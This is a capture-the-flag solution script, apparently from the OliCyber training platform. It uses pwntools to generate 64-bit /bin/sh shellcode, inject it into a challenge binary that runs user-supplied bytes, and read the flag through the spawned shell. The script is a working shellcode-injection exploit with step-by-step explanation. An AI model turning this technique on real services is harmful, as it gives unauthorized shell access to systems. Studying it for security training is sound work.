"""
Problem: Software 20 - Pwntools 4

Category: Software Security

Description: This challenge introduces automated shellcode generation and injection 
using the `pwntools` library. The target C program allocates an executable memory 
segment and prompts the user to specify the size of the payload before reading the 
exact number of bytes. The script leverages `shellcraft` to dynamically generate a 
64-bit shellcode that spawns a `/bin/sh` shell. It carefully handles the I/O 
synchronization to bypass the initial pause, sends the payload size, injects the raw 
shellcode bytes, and interacts with the newly spawned shell to extract the flag.

Algorithm:
- Point 1: Load the local binary using `ELF` and set `context.binary = exe` to automatically configure the architecture (amd64) for the assembler.
- Point 2: Establish the connection (local or remote via `args.REMOTE`).
- Point 3: Receive the initial banner and send a dummy character to bypass the C program's `getchar()` pause.
- Point 4: Generate the shellcode to spawn a shell using `asm(shellcraft.sh())` and calculate its exact byte length.
- Point 5: Synchronize with the size prompt (`max 4096): `) and send the calculated length as a string.
- Point 6: Synchronize with the payload prompt (`bytes: `) and send the raw shellcode using `send()` (crucial: avoiding `sendline()` prevents appending a corrupting `\n` byte).
- Point 7: With the shell now active, send the command `cat flag` to print the flag.
- Point 8: Send the `exit` command to cleanly close the shell session, allowing `recvall()` to terminate and print the final output.

"""

from pwn import *

exe = ELF("./sw-20")

def main():
    
    context.binary = exe

    if args.REMOTE:
        p = remote("software-20.challs.olicyber.it", 13003)
    else:
        p = process([exe.path])

    data = p.recv(1024)
    print(data.decode('utf-8'))
    p.send(b'a')

    shellcode = asm(shellcraft.sh())
    size = len(shellcode)

    p.recvuntil(b'max 4096): ')
    p.sendline(str(size).encode())

    p.recvuntil(b'bytes: ')
    p.send(shellcode)

    p.sendline(b'cat flag')

    p.sendline(b'exit')

    text = p.recvall()
    print(text.decode('utf-8')) 

if __name__ == "__main__":
    main()